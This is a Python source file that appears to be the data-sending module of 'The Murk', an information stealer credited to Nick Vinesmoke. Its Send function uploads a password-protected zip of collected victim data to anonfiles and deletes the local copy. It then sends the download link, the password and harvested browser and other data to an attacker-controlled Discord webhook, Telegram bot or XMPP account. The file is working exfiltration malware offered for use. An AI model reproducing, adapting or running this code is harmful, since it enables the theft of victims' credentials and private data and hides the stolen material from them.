#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#
from requests import post, get
from os import remove


def Send(type,np,data,dataB,dataO,dataW,dataF,dataV,discordData,TelegramData,xmppData):
	if type == 2:
		from xmpp import protocol,Client
	if type == 0:
		from discord_webhook import DiscordWebhook
		
		
	try:
		
		num = np[0].rfind("\\")
		name = np[0][num+1:]
		arr = open(rf'{np[0]}.zip', 'rb')
		files = {
    		'file': (f'{name}.zip', arr),
		}
		url = 'https://api.anonfiles.com/upload'
		response = post(url, files=files)
		dataMain = response.json()
		url = dataMain['data']['file']['url']['short']
		arr.close()

		try:
			remove(f'{np[0]}.zip')
		except Exception as e:
			print(e)
		print(url)
		message = ''
		try:
			if type == 0:
				title = f"▀▀█▀▀ █──█ █▀▀ 　 ░█▀▄▀█ █──█ █▀▀█ █─█ 　 █▀▀█ █▀▀ █▀▀ █──█ █── ▀▀█▀▀ █▀▀\n─░█── █▀▀█ █▀▀ 　 ░█░█░█ █──█ █▄▄▀ █▀▄ 　 █▄▄▀ █▀▀ ▀▀█ █──█ █── ──█── ▀▀█\n─░█── ▀──▀ ▀▀▀ 　 ░█──░█ ─▀▀▀ ▀─▀▀ ▀─▀ 　 ▀─▀▀ ▀▀▀ ▀▀▀ ─▀▀▀ ▀▀▀ ──▀── ▀▀▀\n[Link🔗]({url})\nPassword: ||{np[1]}||\n\n<b>⇓Collected data⇓</b>"
			if type == 1 or type == 2:
				title = f"▀▀█▀▀ █──█ █▀▀ 　 ░█▀▄▀█ █──█ █▀▀█ █─█\n─░█── █▀▀█ █▀▀ 　 ░█░█░█ █──█ █▄▄▀ █▀▄ \n─░█── ▀──▀ ▀▀▀ 　 ░█──░█ ─▀▀▀ ▀─▀▀ ▀─▀\nLink🔗:{url}\nPassword: {np[1]}\n\n<b>⇓Collected data⇓</b>"			
			message += f"{title}"
			try:
				message += data
			except Exception as e:
				print(e)
		except Exception as e:
				print(e)
		try:
			if dataB:
				for text in dataB:
					message+= text

		except Exception as e:
			print(e)
		try:
			if dataO:
				for text in dataO:
					message+= text
		except Exception as e:
			print(e)
		try:
			if dataV:
				for text in dataV:
					message+= text
		except Exception as e:
			print(e)
		try:
			if dataW:
				for text in dataW:
					message+= text
		except Exception as e:
			print(e)
		try:
			if dataF:
				for text in dataF:
					message+= text
		except Exception as e:
			print(e)
		print("send")
		try:
			if type == 0:
				urlWebHook = discordData[0] # url of your WebHook
				botName = discordData[1] # name of that WebHook
				message+="\n\n\n**The Murk|by Nick Vinesmoke**"
				message+="\n@everyone"
				hook = DiscordWebhook(url=urlWebHook, username=botName,content=message)
				response = hook.execute()
			if type == 1:
				Token = TelegramData[0] # HTTPAPI that you got from botFather
				ID = TelegramData[1] # your chat ID
				message+="\n\n\nThe Murk|by Nick Vinesmoke"
				params = {
    				'chat_id': ID,
    				'text': message,
				}
				response = get('https://api.telegram.org/bot'+Token+'/sendMessage', params=params)
			if type == 2:
				jabberid = xmppData[0]
				jabberpassword = xmppData[1]
				jabberreceiver = xmppData[2]
				message+="\n\n\nThe Murk|by Nick Vinesmoke"
				jid = protocol.JID(jabberid)
				connection = Client(server=jid.getDomain())
				connection.connect()
				connection.auth(user=jid.getNode(), password=jabberpassword, resource=jid.getResource())
				connection.send(protocol.Message(to=jabberreceiver, body=message))
		except Exception as e:
			print(e)
	except Exception as e:
			print(e)	